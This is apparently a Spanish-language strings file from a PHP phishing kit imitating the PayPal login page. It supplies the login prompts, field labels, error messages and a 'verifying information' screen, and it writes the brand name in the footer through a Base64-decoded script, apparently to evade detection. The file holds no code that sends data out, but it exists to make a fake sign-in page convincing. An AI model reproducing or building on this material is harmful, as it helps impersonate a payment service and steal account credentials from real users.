<?php
$Z118_01 = "Inicie sesión en su cuenta PayPal";
$Z118_02 = "Correo electrónico";
$Z118_03 = "Contraseña";
$Z118_04 = "El correo electrónico es obligatorio.";
$Z118_05 = "La contraseña es obligatoria.";
$Z118_06 = "Iniciar sesión";
$Z118_07 = "¿No recuerda el correo electrónico o la contraseña?";
$Z118_08 = "Crear cuenta";
$Z118_09 = "Privacidad";
$Z118_10 = "PayPal";
$Z118_11 = "Copyright © 1999-<script>document.write(new Date().getFullYear());</script> <script>document.write(Base64.decode('UGF5UGFs'));</script>. Todos los derechos reservados.";
$Z118_12 = "Verificando la información…";
$Z118_13 = "Algunos de sus datos no son correctos. Inténtelo de nuevo.";
?>
